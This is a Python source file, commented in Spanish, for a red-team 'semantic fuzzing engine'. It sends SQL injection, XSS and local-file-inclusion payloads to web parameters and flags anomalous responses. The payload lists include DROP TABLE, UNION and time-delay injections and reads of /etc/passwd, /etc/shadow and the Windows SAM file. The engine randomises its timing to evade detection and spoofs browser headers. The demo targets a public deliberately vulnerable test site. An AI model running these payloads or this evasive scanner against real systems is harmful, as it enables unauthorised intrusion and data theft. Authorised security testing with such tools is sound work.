#!/usr/bin/env python3
"""
🛡️ HCG Framework - Semantic Fuzzing Engine
[CLASSIFIED]: CONFIDENTIAL - HCG Red Team Operation

Fuzzing dirigido basado en conocimiento del protocolo con análisis
diferencial de respuestas para detectar vulnerabilidades sin firmas.
"""

import asyncio
import re
import time
from typing import Dict, List, Optional, Any, AsyncGenerator
from dataclasses import dataclass, field

try:
    import numpy as np
    HAS_NUMPY = True
except ImportError:
    HAS_NUMPY = False

try:
    import httpx
    HAS_HTTPX = True
except ImportError:
    HAS_HTTPX = False


@dataclass
class FuzzResult:
    """Resultado de una prueba de fuzzing."""
    url: str
    param_name: str
    payload: str
    status_code: int
    anomalies: List[str]
    response_time: float = 0.0
    response_size: int = 0
    baseline_diff: Dict[str, Any] = field(default_factory=dict)


class ServiceFuzzer:
    """
    Motor de fuzzing semántico con análisis diferencial.
    
    Características:
    - Análisis diferencial contra baseline
    - Detección de patrones de error (SQL, OS, stack traces)
    - Jitter log-normal para evasión de detección
    - Soporte para query params, body, headers
    
    Uso:
        fuzzer = ServiceFuzzer()
        async for result in fuzzer.fuzz_endpoint(url, method, param, payloads):
            if result.anomalies:
                print(f"Anomalía detectada: {result.anomalies}")
    """
    
    # Patrones de error para detección de vulnerabilidades
    ERROR_PATTERNS = [
        # SQL Injection
        (r'sql\s*(error|syntax|warning)', 'sqli'),
        (r'mysql.*error', 'sqli'),
        (r'ora-\d+', 'sqli'),
        (r'pg::.*error', 'sqli'),
        (r'sqlite.*error', 'sqli'),
        (r'odbc.*error', 'sqli'),
        (r'syntax\s+error.*sql', 'sqli'),
        (r'unterminated.*string', 'sqli'),
        
        # OS Command Injection
        (r'uid=\d+', 'os_cmd'),
        (r'root:', 'os_cmd'),
        (r'/bin/bash', 'os_cmd'),
        (r'/bin/sh', 'os_cmd'),
        (r'Administrator', 'os_cmd'),
        (r'Microsoft Windows.*System32', 'os_cmd'),
        
        # Path Traversal / LFI
        (r'/etc/passwd', 'lfi'),
        (r'/etc/shadow', 'lfi'),
        (r'C:\\\\Windows', 'lfi'),
        (r'win\\.ini', 'lfi'),
        (r'boot\\.ini', 'lfi'),
        
        # Stack Traces / Debug Info
        (r'stack\s*trace', 'debug'),
        (r'exception.*at', 'debug'),
        (r'file\s+".*"\s+line\s+\d+', 'debug'),
        (r'traceback.*most recent', 'debug'),
        (r'fatal error', 'debug'),
        
        # XSS indicators
        (r'<script[^>]*>alert', 'xss'),
        (r'javascript:alert', 'xss'),
        (r'onerror\s*=', 'xss'),
    ]
    
    def __init__(self, timeout: float = 10.0):
        self.timeout = timeout
        self._client = None
    
    async def _get_client(self):
        """Obtiene cliente HTTP asíncrono."""
        if not HAS_HTTPX:
            raise ImportError("httpx no está instalado. pip install httpx")
        
        if self._client is None or self._client.is_closed:
            self._client = httpx.AsyncClient(
                timeout=self.timeout,
                follow_redirects=True,
                verify=False  # Para testing en entornos controlados
            )
        return self._client
    
    async def close(self):
        """Cierra el cliente HTTP."""
        if self._client and not self._client.is_closed:
            await self._client.aclose()
    
    def _jitter_delay(self, min_s: float = 0.5, max_s: float = 3.0) -> float:
        """Genera delay con distribución log-normal para evasión."""
        if HAS_NUMPY:
            delay = np.random.lognormal(0, 0.5)
            return float(np.clip(delay, min_s, max_s))
        else:
            # Fallback sin numpy
            import random
            return random.uniform(min_s, max_s)
    
    async def capture_baseline(
        self,
        url: str,
        method: str = "GET",
        headers: Optional[Dict[str, str]] = None
    ) -> Dict[str, Any]:
        """Captura respuesta baseline para comparación diferencial."""
        client = await self._get_client()
        
        browser_headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'es-MX,es;q=0.9,en;q=0.8',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
        }
        browser_headers.update(headers or {})
        
        start_time = time.monotonic()
        
        if method.upper() == "GET":
            resp = await client.get(url, headers=browser_headers)
        elif method.upper() == "POST":
            resp = await client.post(url, headers=browser_headers)
        else:
            resp = await client.request(method, url, headers=browser_headers)
        
        elapsed = time.monotonic() - start_time
        
        return {
            'status_code': resp.status_code,
            'length': len(resp.content),
            'time': elapsed,
            'headers': dict(resp.headers),
            'content_hash': hash(resp.content) % (10**9),
            'entropy': self._calculate_entropy(resp.text)
        }
    
    def _calculate_entropy(self, text: str) -> float:
        """Calcula entropía de Shannon del texto."""
        if not text:
            return 0.0
        
        freq = {}
        for c in text:
            freq[c] = freq.get(c, 0) + 1
        
        entropy = 0.0
        length = len(text)
        for count in freq.values():
            p = count / length
            if p > 0:
                import math
                entropy -= p * math.log2(p)
        
        return entropy
    
    async def fuzz_endpoint(
        self,
        url: str,
        method: str,
        param: Dict[str, Any],
        payloads: List[str]
    ) -> AsyncGenerator[FuzzResult, None]:
        """
        Ejecuta fuzzing sobre un endpoint con análisis diferencial.
        
        Args:
            url: URL base del endpoint
            method: Método HTTP (GET, POST)
            param: Diccionario con {'name': 'param_name', 'location': 'query|body|header'}
            payloads: Lista de payloads a probar
            
        Yields:
            FuzzResult para cada payload que genera anomalías
        """
        client = await self._get_client()
        
        # Capturar baseline
        baseline = await self.capture_baseline(url, method)
        
        browser_headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'es-MX,es;q=0.9',
            'Connection': 'keep-alive',
        }
        
        for payload in payloads:
            # Aplicar jitter
            await asyncio.sleep(self._jitter_delay())
            
            param_name = param['name']
            location = param.get('location', 'query')
            
            try:
                start_time = time.monotonic()
                
                # Construir request según ubicación del parámetro
                if location == 'query':
                    params = {param_name: payload}
                    resp = await client.get(url, params=params, headers=browser_headers)
                elif location == 'body':
                    data = {param_name: payload}
                    resp = await client.post(url, data=data, headers=browser_headers)
                elif location == 'header':
                    custom_headers = {**browser_headers, param_name: payload}
                    resp = await client.get(url, headers=custom_headers)
                else:
                    continue
                
                elapsed = time.monotonic() - start_time
                
                # Análisis diferencial
                anomalies = self._analyze_differential(baseline, resp, elapsed)
                
                if anomalies:
                    yield FuzzResult(
                        url=url,
                        param_name=param_name,
                        payload=payload,
                        status_code=resp.status_code,
                        anomalies=anomalies,
                        response_time=elapsed,
                        response_size=len(resp.content),
                        baseline_diff={
                            'status_diff': resp.status_code - baseline['status_code'],
                            'length_diff': len(resp.content) - baseline['length'],
                            'time_diff': elapsed - baseline['time'],
                            'entropy_diff': self._calculate_entropy(resp.text) - baseline['entropy']
                        }
                    )
                    
            except Exception as e:
                # Error de conexión o timeout también es información valiosa
                yield FuzzResult(
                    url=url,
                    param_name=param_name,
                    payload=payload,
                    status_code=0,
                    anomalies=[f'error:{type(e).__name__}'],
                    response_time=0,
                    response_size=0
                )
    
    def _analyze_differential(
        self,
        baseline: Dict[str, Any],
        response,
        elapsed: float
    ) -> List[str]:
        """Analiza diferencias entre baseline y respuesta de test."""
        anomalies = []
        
        # 1. Cambio significativo en status code
        status_diff = response.status_code - baseline['status_code']
        if abs(status_diff) >= 100:  # Ej: 200→500, 200→302
            anomalies.append(f'status_change:{baseline["status_code"]}→{response.status_code}')
        
        # 2. Cambio significativo en longitud de respuesta
        length_diff = len(response.content) - baseline['length']
        if abs(length_diff) > baseline['length'] * 0.5:  # >50% cambio
            anomalies.append(f'size_delta:{length_diff:+d}')
        elif abs(length_diff) > 1000:  # O >1000 bytes absolutos
            anomalies.append(f'size_delta:{length_diff:+d}')
        
        # 3. Time-based anomaly (>3s más lento puede indicar time-based injection)
        time_diff = elapsed - baseline['time']
        if time_diff > 3.0:
            anomalies.append(f'time_delta:+{time_diff:.2f}s')
        
        # 4. Patrones de error en contenido
        content_lower = response.text.lower()
        for pattern, vuln_type in self.ERROR_PATTERNS:
            if re.search(pattern, content_lower, re.IGNORECASE):
                anomalies.append(f'pattern:{vuln_type}')
        
        # 5. Cambio drástico en entropía
        current_entropy = self._calculate_entropy(response.text)
        entropy_diff = abs(current_entropy - baseline['entropy'])
        if entropy_diff > 1.0:
            anomalies.append(f'entropy_delta:{entropy_diff:+.2f}')
        
        return anomalies
    
    def generate_sqli_payloads(self) -> List[str]:
        """Genera payloads comunes para SQL injection."""
        return [
            "'", "''", "'--", "\"", "\"--",
            "'; DROP TABLE users--",
            "' OR '1'='1",
            "' OR '1'='1'--",
            "' OR 1=1--",
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "1; WAITFOR DELAY '0:0:5'--",
            "1' AND SLEEP(5)--",
            "admin'--",
            "' OR username LIKE '%admin%",
            "1' ORDER BY 10--",
            "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
        ]
    
    def generate_xss_payloads(self) -> List[str]:
        """Genera payloads comunes para XSS."""
        return [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "\"><script>alert(1)</script>",
            "'><script>alert(1)</script>",
            "javascript:alert(1)",
            "<svg onload=alert(1)>",
            "<body onload=alert(1)>",
            "<iframe src='javascript:alert(1)'>",
            "<input onfocus=alert(1) autofocus>",
        ]
    
    def generate_lfi_payloads(self) -> List[str]:
        """Genera payloads comunes para Local File Inclusion."""
        return [
            "../../../etc/passwd",
            "....//....//....//etc/passwd",
            "/etc/passwd",
            "/etc/shadow",
            "../../../../../../windows/win.ini",
            "C:\\windows\\win.ini",
            "..\\..\\..\\..\\windows\\system32\\config\\sam",
            "php://filter/convert.base64-encode/resource=index.php",
            "file:///etc/passwd",
            "expect://id",
        ]


async def main():
    """Ejemplo de uso del fuzzer."""
    print("=" * 60)
    print("HCG Framework - Demo de Fuzzing Semántico")
    print("=" * 60)
    
    fuzzer = ServiceFuzzer()
    
    # Ejemplo con payloads SQLi
    payloads = fuzzer.generate_sqli_payloads()
    param = {'name': 'id', 'location': 'query'}
    
    print(f"\n[*] Probando {len(payloads)} payloads SQLi...")
    
    async for result in fuzzer.fuzz_endpoint(
        url="http://testphp.vulnweb.com/listproducts.php",
        method="GET",
        param=param,
        payloads=payloads
    ):
        print(f"\n[!] Anomalía detectada:")
        print(f"    URL: {result.url}")
        print(f"    Param: {result.param_name}={result.payload}")
        print(f"    Status: {result.status_code}")
        print(f"    Anomalías: {', '.join(result.anomalies)}")
    
    await fuzzer.close()


if __name__ == "__main__":
    asyncio.run(main())
